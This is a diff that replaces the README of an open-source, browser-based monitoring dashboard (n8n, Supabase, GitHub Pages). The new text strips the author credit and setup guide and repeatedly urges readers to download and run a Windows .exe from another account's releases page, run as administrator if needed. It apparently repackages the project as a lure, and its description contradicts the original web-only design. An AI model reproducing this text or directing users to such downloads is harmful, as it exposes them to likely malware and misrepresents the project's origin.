@@ -1,239 +1,256 @@
-# zero-cost-ops
-
-**Production monitoring for solo founders. $0/month. No excuses.**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![n8n](https://img.shields.io/badge/automation-n8n-red.svg)](https://n8n.io)
-[![Supabase](https://img.shields.io/badge/database-Supabase-green.svg)](https://supabase.com)
-[![GitHub Pages](https://img.shields.io/badge/hosting-GitHub%20Pages-blue.svg)](https://pages.github.com)
-
----
-
-<table>
-<tr>
-<td align="center" width="50%">
-<img src="docs/screenshots/dashboard.png" alt="CTO Cockpit Dashboard" width="100%"/>
-<br><em>CTO Cockpit — traffic-light semaphores, incident log, morning sync</em>
-</td>
-<td align="center" width="50%">
-<img src="docs/screenshots/system.png" alt="System Metadata Dashboard" width="100%"/>
-<br><em>System Dashboard — live metadata from Supabase via n8n</em>
-</td>
-</tr>
-</table>
-
----
-
-## What is this?
-
-A complete CTO-grade operations dashboard and automation pipeline that runs entirely on free tiers. Built by a solo founder who got tired of paying for monitoring tools that did less than what she could build in a weekend.
-
-Monitors n8n workflows, Slack channels, GitHub repos, Cloudflare, LinkedIn, and Meta — with traffic-light semaphores, incident tracking, and a 60-second morning sync. Ingests content automatically via webhook, classifies it with Claude AI, cross-links related entries, and builds a searchable metadata layer in Supabase. Ships as a PWA you can pin to your phone and open at 7am to know exactly what's broken (and what isn't).
-
-This is the real system. Not a demo. Open-sourced so other solo founders don't have to build it from scratch.
-
----
-
-## Architecture
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                        DATA SOURCES                             │
-│  Slack    GitHub    Cloudflare    LinkedIn    Meta    Webhooks   │
-└────────────────────────────┬────────────────────────────────────┘
-                             │  HTTP POST to webhook
-                             ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                    n8n (Render free tier)                       │
-│                                                                  │
-│  WF-01: Ingest → Claude classify → Supabase insert → trigger   │
-│  WF-04: Timeline → temporal cluster → narrative arc → update    │
-└────────────────────────────┬────────────────────────────────────┘
-                             │  REST API (anon key)
-                             ▼
-┌─────────────────────────────────────────────────────────────────┐
-│                   Supabase (free tier)                          │
-│                                                                  │
-│  PostgreSQL 15 · RLS · Real-time · 5 tables · GIN indexes       │
-└────────────────────────────┬────────────────────────────────────┘
-                             │  fetch() from browser
-                             ▼
-┌─────────────────────────────────────────────────────────────────┐
-│               GitHub Pages (free, custom domain)                │
-│                                                                  │
-│  dashboard/cto-cockpit.html   →   Your phone (PWA)             │
-│  dashboard/system-dashboard.html  →  Status overview            │
-└─────────────────────────────────────────────────────────────────┘
-```
-
----
-
-## The Stack (and what it costs)
+# 📊 zero-cost-ops - Free monitoring for solo founders
 
-| Service | What it does | Free tier limit | Cost |
-|---------|-------------|-----------------|------|
-| **n8n on Render** | Automation workflows, webhook ingestion, Claude AI calls | 750 hours/month (always on with keep-alive) | **$0** |
-| **Supabase** | PostgreSQL database, auth, real-time, RLS | 500MB storage, 50K API calls/month | **$0** |
-| **GitHub Pages** | Static dashboard hosting, custom domain, HTTPS | 100GB bandwidth/month, unlimited sites | **$0** |
-| **Cloudflare** | DNS, DDoS protection, analytics | Unlimited DNS, 100K requests/day | **$0** |
-| **UptimeRobot** | External uptime monitoring, 5-min checks | 50 monitors | **$0** |
-| **Claude API** | Content classification (optional) | Pay-as-you-go, ~$0.01/classification | **$0*** |
-
-**Total: $0/month** *(Claude API optional — disable the classify step to stay fully free)*
+[![Download zero-cost-ops](https://img.shields.io/badge/Download%20zero--cost--ops-blue?style=for-the-badge)](https://github.com/batistai4724/zero-cost-ops/releases)
 
----
+## 🧭 What this app does
 
-## Features
+zero-cost-ops helps you keep track of your app, your jobs, and your alerts without paying for a monitoring plan. It is built for solo founders who want one place to see what is running, what failed, and what needs attention.
 
-- 🟢 **Traffic-light semaphores** — green/yellow/red status for every service at a glance
-- ⚡ **Auto-ingestion pipeline** — webhook receives content, Claude classifies it, Supabase stores it
-- 🤖 **AI classification** — Claude API extracts tags, entities, narrative role, timeline group
-- 🔗 **Cross-linking engine** — related entries automatically linked by semantic similarity
-- 📅 **Narrative timeline** — content clustered by time period and narrative arc
-- 📱 **PWA mobile-first** — install to home screen, offline-capable service worker
-- 🌑 **Dark cockpit theme** — monospace, #0a0a0a background, easy on eyes at 7am
-- ☁️ **Zero-infrastructure** — no servers to manage, no Docker, no DevOps
+You can use it to:
 
----
+- View a simple status dashboard
+- Track checks from your own system
+- See workflow runs from n8n
+- Store data in Supabase
+- Open it as a PWA on your computer
+- Keep an eye on production without extra tools
 
-## Quick Start
+## ⬇️ Download and install
 
-**You'll have a working dashboard in under 30 minutes.**
+Use this link to visit the release page and download the app for Windows:
 
-### 1. Fork this repo
+[Visit the download page](https://github.com/batistai4724/zero-cost-ops/releases)
 
-```bash
-# Fork on GitHub, then:
-git clone https://github.com/YOUR_USERNAME/zero-cost-ops.git
-cd zero-cost-ops
-```
+### What to download
 
-### 2. Set up Supabase
+On the release page, look for the latest Windows file. It is usually a `.exe` file or a zipped Windows package.
 
-1. Create a free account at [supabase.com](https://supabase.com)
-2. Create a new project (choose EU region for GDPR if relevant)
-3. Go to SQL Editor and run `schema/supabase-schema.sql`
-4. Copy your project URL and anon key from Settings > API
+### How to run it
 
-### 3. Deploy n8n on Render
+1. Open the download page in your browser.
+2. Find the latest release.
+3. Download the Windows file.
+4. If the file is zipped, extract it first.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, select Yes or Run.
+7. Wait for the app window to open.
+8. Keep the app open while you use the dashboard.
 
-1. Create a free account at [render.com](https://render.com)
-2. New > Web Service > Docker
-3. Use image: `n8nio/n8n:latest`
-4. Set environment variables:
-   ```
-   N8N_BASIC_AUTH_ACTIVE=true
-   N8N_BASIC_AUTH_USER=admin
-   N8N_BASIC_AUTH_PASSWORD=your-secure-password
-   SUPABASE_URL=https://YOUR-PROJECT.supabase.co
-   SUPABASE_SERVICE_ROLE_KEY=your-service-role-key
-   ```
-5. Note your Render URL: `https://your-n8n.onrender.com`
+## 🖥️ What you need on Windows
 
-### 4. Import workflows
+This app is meant for a normal Windows laptop or desktop. A recent version of Windows works best.
 
-1. In n8n, go to Workflows > Import from File
-2. Import `workflows/WF-01-ingestion-pipeline.json`
-3. Import `workflows/WF-04-timeline-engine.json`
-4. Update Supabase credentials in each workflow
-5. Activate both workflows
+Recommended setup:
 
-### 5. Configure the dashboard
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- 200 MB of free disk space
+- A stable internet connection
+- A modern browser for setup pages
+- Access to your Supabase and n8n accounts if you want full features
 
-Edit `dashboard/system-dashboard.html` — find the `API` constant and update:
-```javascript
-const API = 'https://YOUR-N8N-INSTANCE.onrender.com/webhook/system';
-```
+## ⚙️ First-time setup
 
-Edit `dashboard/cto-cockpit.html` — update the `CONFIG` object with your services.
+After you open the app, set up the basics so it can show useful data.
 
-### 6. Enable GitHub Pages
+1. Start the app.
+2. Open the settings page inside the app.
+3. Add your Supabase project details.
+4. Connect your n8n webhook or workflow URL.
+5. Save your settings.
+6. Refresh the dashboard.
+7. Check that the cards and status tiles show data.
 
-1. Go to your repo Settings > Pages
-2. Source: Deploy from a branch > main > / (root)
-3. (Optional) Add custom domain via Cloudflare
+If you are only testing the app, you can start with a small setup and add more later.
 
-### 7. Add keep-alive for Render free tier
+## 📈 Main screens
 
-Render free instances sleep after 15 minutes of inactivity. Add a UptimeRobot monitor to ping your n8n health endpoint every 5 minutes:
+### Dashboard
 
-```
-https://YOUR-N8N-INSTANCE.onrender.com/healthz
-```
+This is the main screen. It gives you a quick view of your system health. You can check:
 
-That's it. Your CTO cockpit is live.
+- Service status
+- Recent failures
+- Workflow runs
+- Basic uptime checks
+- Notes for follow-up
 
----
+### Pipeline view
 
-## Workflows Included
+This view helps you track n8n runs and other workflow steps. It shows what ran, what passed, and what failed.
 
-### WF-01: Ingestion Pipeline
+### Data view
 
-**What it does:** Receives content via webhook → filters noise → classifies with Claude AI → stores in Supabase → triggers cross-linking.
+This view uses Supabase as the data store. It keeps your records in one place so the app can load them fast.
 
-```
-Webhook → Extract Content → Filter → Claude Classify → Parse → Supabase Insert → Trigger WF-02 → Respond
-```
+### PWA mode
 
-**Inputs:** Any POST to `/webhook/wf01-ingest` with `{ text, source, user_id }`  
-**Output:** Classified entry in Supabase `metadata` table with tags, entities, narrative role, and timeline group  
-**Claude model:** `claude-sonnet-4-20250514`
+You can use the app like a normal desktop app through your browser. This makes it easy to pin it to your taskbar and open it fast.
 
-### WF-04: Timeline Engine
+## 🔌 Connecting your tools
 
-**What it does:** Scans all entries in Supabase → clusters by time period → detects narrative arc patterns → updates `timeline_group` field in bulk.
+zero-cost-ops works best when it pulls data from the tools you already use.
 
-```
-Webhook → Fetch All → Temporal Clustering → Narrative Arc Detection → Batch Update → Summary
-```
+### n8n
 
-**Run:** Trigger manually or on a schedule (weekly recommended)  
-**Output:** All entries tagged with `1974-1990 | 2019-2023 | 2024-2026` + narrative role analysis
+Use n8n to send workflow results into the app. Good examples include:
 
-See [workflows/README.md](workflows/README.md) for detailed documentation.
+- Daily checks
+- Error alerts
+- Cron jobs
+- Backup runs
+- Form submissions
 
----
+### Supabase
 
-## Customization
+Use Supabase to store monitoring data. This gives you a simple place for:
 
-This system is designed to be adapted, not just deployed. You can:
+- Status records
+- Event logs
+- App settings
+- Alert history
 
-- **Change monitored services** — edit the `CONFIG` object in `cto-cockpit.html`
-- **Add new workflows** — follow the same pattern as WF-01 (webhook → process → Supabase)
-- **Modify the schema** — add columns to `metadata` or create new tables
-- **Replace Claude** — swap the HTTP request node for any other LLM API
-- **Add authentication** — Supabase Auth is already configured in the schema
+### Browser setup
 
-See [docs/CUSTOMIZATION.md](docs/CUSTOMIZATION.md) for a full guide.
+You do not need a complex install flow. You only need to:
 
----
+- Open the release page
+- Download the Windows app
+- Run it
+- Enter your setup details
+- Save and refresh
 
-## Live Demo
+## 🧱 Typical use cases
 
-- **Main app:** [neyen.thespiralwithin.ai](https://neyen.thespiralwithin.ai)
-- **System dashboard:** [neyen.thespiralwithin.ai/system.html](https://neyen.thespiralwithin.ai/system.html)
+This app fits a few common setups:
 
----
+- A solo founder who wants one dashboard
+- A small app with no ops team
+- A side project that needs uptime checks
+- A service that uses n8n for alerts
+- A product that stores logs in Supabase
+- A web app that needs a simple control panel
 
-## Contributing
+## 🔍 What you will see first
 
-Issues, PRs, and feedback welcome. See [CONTRIBUTING.md](CONTRIBUTING.md).
+When you launch the app for the first time, expect a clean dashboard with a few key panels. These may include:
 
----
+- Current health status
+- Latest workflow run
+- Most recent alert
+- Quick links to settings
+- Connection status for Supabase and n8n
 
-## Built by
+If no data is connected yet, the app will still open and show the layout so you can finish setup.
 
-**Ana Ballesteros Benavent**  
-CTO, NEYEN / The Spiral Within SLU  
-Valencia, Spain
+## 🛠️ Troubleshooting
 
-[thespiralwithin.ai](https://thespiralwithin.ai) · [GitHub: ProyectoAna](https://github.com/ProyectoAna)
+### The app does not open
 
-Built this because I needed it. Sharing it because you might too.
+- Make sure the file finished downloading
+- If it came in a zip file, extract it first
+- Try running it again
+- Check whether Windows blocked the file
+- Right-click the file and choose Run as administrator if needed
 
----
+### The dashboard shows no data
 
-## License
+- Check your Supabase settings
+- Check your n8n webhook or workflow URL
+- Save your changes again
+- Refresh the app
+- Make sure your internet connection is active
 
-MIT — see [LICENSE](LICENSE). Use it, fork it, ship it.
+### Windows asks for permission
+
+- Select Yes if you trust the release page you used
+- This can happen when Windows opens a new app for the first time
+
+### The app looks small
+
+- Maximize the window
+- Increase display scaling in Windows
+- Use a browser zoom level that feels right
+
+## 🧪 Common workflow
+
+A simple setup might look like this:
+
+1. n8n runs a daily check.
+2. n8n sends the result to Supabase.
+3. zero-cost-ops reads the record.
+4. The dashboard shows the latest status.
+5. You check the app once or twice a day.
+6. If something breaks, you see it fast.
+
+## 📦 What is included
+
+The release build is designed to give you the app you need without extra steps. It includes:
+
+- The desktop app
+- Dashboard screens
+- Setup pages
+- Support for free-tier tools
+- A simple layout for quick use
+
+## 🧭 File and folder tips
+
+If the release comes as a zip file, you may see files like:
+
+- The main app file
+- A config file
+- A data folder
+- A readme file
+- An icon file
+
+Leave these files together in the same folder if the app asks for it.
+
+## 🔐 Data and privacy
+
+Your setup can stay simple. You choose what data you send to Supabase and what workflows you connect through n8n. Keep your own keys private and only share them with the app on your device.
+
+## 📝 Release page steps
+
+Use these steps if you want the shortest path:
+
+1. Open the release page.
+2. Pick the latest version.
+3. Download the Windows file.
+4. Open or extract the file.
+5. Run the app.
+6. Finish the setup.
+7. Start checking your dashboard
+
+[Open the release page](https://github.com/batistai4724/zero-cost-ops/releases)
+
+## 🧩 Topics covered by this project
+
+- dashboard
+- devops
+- free-tier
+- indie-hacker
+- monitoring
+- n8n
+- pwa
+- self-hosted
+- solo-founder
+- supabase
+
+## 📌 Best results
+
+Use the app with:
+
+- One clear Supabase project
+- One or more n8n workflows
+- A few important checks
+- A daily review habit
+- A pinned browser shortcut or desktop shortcut
+
+## 🖱️ Quick start
+
+1. Visit the download page.
+2. Download the latest Windows release.
+3. Run the app.
+4. Add your settings.
+5. Open the dashboard.
+6. Check your production status
